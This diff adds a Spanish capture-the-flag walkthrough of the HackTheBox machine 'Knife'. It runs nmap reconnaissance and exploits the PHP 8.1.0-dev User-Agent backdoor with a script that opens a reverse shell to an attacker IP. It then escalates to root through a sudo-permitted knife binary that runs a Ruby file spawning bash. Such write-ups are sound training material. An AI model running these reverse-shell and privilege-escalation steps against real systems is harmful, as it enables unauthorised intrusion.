@@ -1,0 +1,148 @@
+# Knife
+![alt text](image.png)
+ 
+<table>
+  <tr>
+    <td style="vertical-align: top; padding-right: 20px;">
+      <img src="portadas/Knife.png" alt="Knife" style="max-width:320px; width:100%; height:auto;"/>
+    </td>
+    <td style="vertical-align: top; padding-left: 20px;">
+      <strong>Vulnerabilidades / Características a tratar</strong>
+      <ul>
+        <li>PHP 8.1.0-dev - 'User-Agent' Remote Code Execution [RCE]</li>
+        <li>Abusing Sudoers Privilege (Knife binary)</li>
+      </ul>
+    </td>
+  </tr>
+</table>
+
+## Reconocimiento inicial
+Realizamos un escaneo de todos los puertos para comprobar cuáles estan abiertos y lo exportamos al fichero `allports` 
+
+```shell
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allports
+```
+
+```shell
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+```
+
+Vamos a realizar un escaneo más exaustivo de los siguiente puertos encontrados:
+
+
+```shell
+nmap -sCV -p22,80 10.10.10.242 -oN targeted
+```
+
+Se puede comprobar que no encontramos nada interesante o vulnerable.
+
+```shell
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds
+```
+
+Con el siguiente comando voy a comprobar que nos encontramos en la página web.
+
+```shell
+whatweb http://10.10.10.242
+http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]    
+```
+
+Voy a realizar un pequeño fuzzing y comprobar si exiten algunos directorios interesantes.
+
+```shell
+nmap --script http-enum -p80 10.10.10.68
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|_  /icons/: Potentially interesting folder
+
+
+```
+No encontramos nada interesante 
+
+## Revisamos la pag web
+
+Cuando revisamos la web no nos encontramos  nada interesante ni ningun ususario potencial.
+
+## Intrusion 
+Para la intrusion nos damos cuenta que usa una version interesante de php `8.1.0-dev` por lo tnato vamos a ver si existe alguna vulnerabilidad interesante que se pueda explotar y enocntramos el siguiente repositorio.
+
+```
+https://github.com/flast101/php-8.1.0-dev-backdoor-rce
+```
+
+Donde explica que nos encontramos ante una version de php que es vulnerable y podemos ejecutar comandos. Por lo tanto lo ejecutamos de la siguiente manera para entablar una rever shell:
+
+```shell
+python3 revshell_php_8.1.0-dev.py http://10.10.10.242/ 10.10.14.8 4444
+```
+
+## Tratamiento de la TTY
+Como siempre hacemos el tratamiento de la TTY para ello realizamos lo siguiente
+
+```shell
+script /dev/null -c bash
+CTRL Z
+stty raw -echo; fg
+reset xterm
+```
+
+De esta manera ya tendremos una terminal totalmetne interactiva además de que podemos ir al directorio `/home` y ver la flag de user.txt
+
+
+
+## Escalada de privilegios
+
+Comprobamos que recursos podemos ejecutar como root usamos el siguiente comando:
+```shell
+sudo -l
+```
+
+```shell
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+```
+
+Al parecer podemos ejecutar un binario `/usr/bin/knife`
+
+Si intentamos ejecutarlo nos encontramos que en el manual hay una opcion en la que podemos ejecutar comandos de un fichero y además que este binario esta escrito en ruby por lo tanto puede que no deje ejecutar ficheros en ruby.
+
+para ello creo dos ficheros uno ruby y otro en bash 
+
+ruby.rb
+```rb
+# script.rb
+system("bash shell.sh")
+```
+shell.sh
+```shell
+#!/bin/bash
+exec bash -i
+```
+de esta manera obtenemos una shell con privilegios.
+
+```shell
+james@knife:/tmp/bundler/home$ sudo -u root /usr/bin/knife exec ruby.rb
+root@knife:/tmp/bundler/home# whoami
+root
+```
